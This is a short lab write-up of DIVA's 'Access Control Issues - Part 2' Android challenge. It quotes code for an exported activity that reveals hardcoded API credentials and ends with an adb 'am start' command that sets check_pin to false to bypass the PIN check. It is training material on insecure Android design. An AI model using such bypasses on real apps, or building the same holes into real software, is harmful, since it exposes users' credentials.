## Access Control Issues - Part 2

Codice Vulnerabile:

> app/src/main/AndroidManifest.xml

```
<activity
    android:name=".AccessControl2Activity"
    android:label="@string/d10" >
</activity>
<activity
    android:name=".APICreds2Activity"
    android:label="@string/apic2_label" >
    <intent-filter>
        <action android:name="jakhar.aseem.diva.action.VIEW_CREDS2" />

        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
```

> app/src/main/java/jakhar/aseem/diva/APICreds2Activity.java

```
boolean bcheck = i.getBooleanExtra(getString(R.string.chk_pin), true);

if (bcheck == false) {
	// Connect to vendor cloud and send User PIN
	// Get API credentials and other confidential details of the user
	String apidetails = "TVEETER API Key: secrettveeterapikey\nAPI User name: diva2\nAPI Password: p@ssword2";
	// Display the details on the app
	apicview.setText(apidetails);
}
else {
	apicview.setText("Register yourself at http://payatu.com to get your PIN and then login with that PIN!");
	pintext.setVisibility(View.VISIBLE);
	vbutton.setVisibility(View.VISIBLE);
}
```

> app/src/main/res/values/strings.xml

```
<string name="chk_pin">check_pin</string>
```

Exploit:

- `$ adb shell`

- `# am start -n jakhar.aseem.diva/.APICreds2Activity -a jakhar.aseem.diva.action.VIEW_CREDS2 --ez check_pin false`
